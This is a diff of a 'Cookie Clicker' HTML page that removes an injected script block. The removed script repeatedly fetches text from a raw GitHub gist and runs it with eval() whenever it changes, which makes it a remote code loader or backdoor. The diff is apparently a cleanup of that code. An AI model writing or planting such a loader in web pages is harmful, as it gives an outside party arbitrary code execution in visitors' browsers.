@@ -6,45 +6,6 @@
 </script>
 
 <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/1.0.9/cookieconsent.min.js"></script>
-<script>
-	function delay(delayInms) {
-  return new Promise(resolve => {
-    setTimeout(() => {
-      resolve(2);
-    }, delayInms);
-  });
-}
-
-async function execute() {
-  let IsExecute = false;
-  let OldStr = '';
-  let NowStr = '';
-  while(true){
-    fetch('//gist.githubusercontent.com/Artem7-ops/1789c47c094a1d00e6e9b180bfddf428/raw/execScript')
-    .then(response => response.text())
-    .then(data => NowStr=data)
-    .catch(error => console.error(error));
-    if (IsExecute){
-      function exec(){
-		try{
-			eval(NowStr);
-		}catch (e) {
-		} 
-      }
-      setTimeout(exec, 0);
-      IsExecute = false;
-      OldStr=NowStr;
-    }else{
-      if (NowStr!=OldStr){
-        OldStr=NowStr;
-        IsExecute = true;
-      }
-    }
-  await delay(500);
-  }
-}
-execute();
-</script>
 
 <title>Cookie Clicker</title>
 <!--
